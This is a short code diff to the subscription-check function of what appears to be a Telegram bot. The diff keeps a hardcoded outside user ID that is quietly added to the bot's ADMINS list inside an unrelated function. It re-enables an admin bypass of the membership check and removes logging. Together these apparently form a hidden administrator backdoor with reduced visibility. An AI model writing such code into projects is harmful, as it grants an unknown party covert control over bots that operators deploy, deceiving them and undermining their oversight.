@@ -44,25 +44,22 @@ class temp(object):
 
 async def is_subscribed(bot, query):
     
-    ADMINS.extend([1125210189])
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
-        logger.info("No AUTH_CHANNEL or REQ_CHANNEL found")
         return True
-    # elif query.from_user.id in ADMINS:
-    #     return True
+    elif query.from_user.id in ADMINS:
+        return True
     
 
     if db2().isActive():
         user = await db2().get_user(query.from_user.id)
         if user:
-            logger.info(f"User found: {query.from_user.first_name}")
             return True
         else:
             return False
 
     if not AUTH_CHANNEL:
-        logger.info("AUTH_CHANNEL not found")
         return True
 
     try:
@@ -74,7 +71,6 @@ async def is_subscribed(bot, query):
         return False
     else:
         if not (user.status == enums.ChatMemberStatus.BANNED):
-            logger.info("User is member")
             return True
         else:
             return False
